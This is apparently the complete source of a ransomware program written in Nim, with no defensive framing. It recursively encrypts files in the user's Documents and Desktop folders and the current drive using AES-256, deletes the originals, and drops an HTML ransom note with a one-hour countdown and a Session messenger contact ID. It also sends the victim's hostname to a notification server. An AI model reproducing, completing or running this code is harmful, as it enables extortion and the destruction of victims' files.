import os, nimcrypto, strutils, osproc, asyncdispatch, httpclient

const defaultHtml = """
<!DOCTYPE html>
<html>
<head>
    <title>YOUR FILES HAVE BEEN ENCRYPTED</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-red-800 text-white flex items-center justify-center h-screen">
    <div class="flex w-full max-w-6xl h-4/5">
        <div class="w-2/5 h-full flex items-center justify-center">
            <img src="https://static.vecteezy.com/system/resources/previews/024/212/248/non_2x/ai-generated-sticker-anime-girl-blue-and-red-hair-png.png" alt="Anime Girl" class="h-full object-contain">
        </div>
        
        <div class="w-3/5 flex items-center justify-center p-8 bg-red-900">
            <div class="text-center max-w-2xl">
                <h1 class="text-4xl font-bold mb-6">YOUR FILES HAVE BEEN ENCRYPTED</h1>
                <div id="timer" class="text-6xl font-mono mb-8 bg-black p-4 rounded">01:00:00</div>
                
                <div class="text-left mb-8">
                    <p class="mb-4">All your files have been encrypted with military grade encryption.</p>
                    <p class="mb-4">To decrypt your files, download the Session app from the play store or app store and contact us on the following id</p>
                    <p class="font-mono text-yellow-300 text-xl mb-4">05ebdea0623665a812a50659065edc8eb0d9e8594553b1180fa04cec9408390f31</p>             
                </div>
            </div>
        </div>
    </div>
<body>
    <script>
        const countdownEndTime = Date.now() + (60 * 60 * 1000);
        const timerDisplay = document.getElementById('timer');
        function updateTimer() {
            const now = Date.now();
            const distance = countdownEndTime - now;
            if (distance < 0) {
                timerDisplay.innerHTML = "EXPIRED";
                clearInterval(countdownInterval);
                return;
            }
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
            const format = (num) => num.toString().padStart(2, '0');
            timerDisplay.innerHTML = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
        }
        updateTimer();
        const countdownInterval = setInterval(updateTimer, 1000);
    </script>
</body>
</html>
"""

const key* = "0123456789abcdef0123456789abcdef"
const iv* = "abcdef9876543210"
const extension* = ".locked"
var htmlContent* = "YOUR_HTML_RANSOM_NOTE_CONTENT_HERE"
const serverUrl* = "http://localhost:8080"

proc processFile(file: string, key: string, iv: string, extension: string) =
  try:
    if fileExists(file) and not file.endsWith(extension) and not file.contains("ransom.html"):
      let content = readFile(file)
      var ctx: CTR[aes256]
      ctx.init(key, iv)
      var cryptContent = newString(content.len)
      ctx.encrypt(content, cryptContent)
      ctx.clear()
      let newPath = file & extension
      writeFile(newPath, cryptContent)
      removeFile(file)
      echo "Encrypted: ", file
  except OSError as e:
    echo "Error processing file ", file, ": ", e.msg
  except Exception as e:
    echo "Unexpected error in file ", file, ": ", e.msg

proc decryptFile(file: string, key: string, iv: string, extension: string) =
  try:
    if fileExists(file) and file.endsWith(extension):
      let content = readFile(file)
      var ctx: CTR[aes256]
      ctx.init(key, iv)
      var decryptContent = newString(content.len)
      ctx.encrypt(content, decryptContent)
      ctx.clear()
      let originalPath = file.substr(0, file.len - extension.len)
      writeFile(originalPath, decryptContent)
      removeFile(file)
      echo "Decrypted: ", originalPath
  except OSError as e:
    echo "Error decrypting file ", file, ": ", e.msg
  except Exception as e:
    echo "Unexpected error decrypting file ", file, ": ", e.msg

proc openInDefaultBrowser(filePath: string) =
  var cmd = ""
  when defined(windows):
    cmd = "start"
  elif defined(macosx):
    cmd = "open"
  elif defined(linux):
    cmd = "xdg-open"
  else:
    raise newException(OSError, "Unsupported OS for opening browser")
  
  try:
    let fullCmd = cmd & " \"" & filePath & "\""
    discard execShellCmd(fullCmd)
    echo "Opened ransom note in default browser: ", filePath
  except OSError as e:
    echo "Error opening browser: ", e.msg

proc getHostname(): string =
  when defined(windows):
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown_hostname"
  else:
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown_hostname"

let machineName = getHostname()

proc sendNotification(message: string) {.async.} =
  if serverUrl.len == 0:
    echo "Server URL not configured. Skipping notification."
    return
  
  try:
    let client = newHttpClient()
    let data = "{\"hostname\":\"" & machineName & "\",\"message\":\"" & message & "\"}"
    client.headers = newHttpHeaders({"Content-Type": "application/json"})
    let response = client.postContent(serverUrl & "/notify", body = data)
    echo "Notification sent to HTTP server: ", message
  except Exception as e:
    echo "Failed to send notification to HTTP server: ", e.msg

proc main() =  
  when defined(decrypt):
    const decryptMode = true
  else:
    const decryptMode = false

  let targetDir = getHomeDir() / "Documents"
  let desktop = getHomeDir() / "Desktop"
  let currentDrive = getCurrentDir().split(PathSep)[0] & PathSep
  var files = newSeq[string]()

  var root: string
  when defined(windows):
    root = getEnv("SystemDrive") & PathSep
  else:
    root = "/"

  let correctedExtension = if extension.startsWith("."): extension else: "." & extension

  if decryptMode:
    echo "Starting decryption..."
    for dir in [root, desktop, currentDrive]:
      for file in walkDirRec(dir):
        if file.endsWith(correctedExtension):
          files.add(file)
    
    echo "Found ", files.len, " files to decrypt."
    for file in files:
      decryptFile(file, key, iv, correctedExtension)
    echo "Decryption complete."
  else:
    echo "Starting encryption..."
    for dir in [targetDir, desktop, currentDrive]:
      for file in walkDirRec(dir):
        if fileExists(file) and not file.endsWith(correctedExtension) and not file.contains("ransom.html"):
          files.add(file)
    
    echo "Found ", files.len, " files to encrypt."
    for file in files:
      processFile(file, key, iv, correctedExtension)

    if htmlContent.len == 0:
      htmlContent = defaultHtml

    let ransomFile = joinPath(desktop, "ransom.html")
    try:
      writeFile(ransomFile, htmlContent)
      openInDefaultBrowser(ransomFile)
      echo "Ransom note created at ", ransomFile
    except OSError as e:
      echo "Error creating or opening ransom note: ", e.msg
    waitFor sendNotification("Encryption complete")

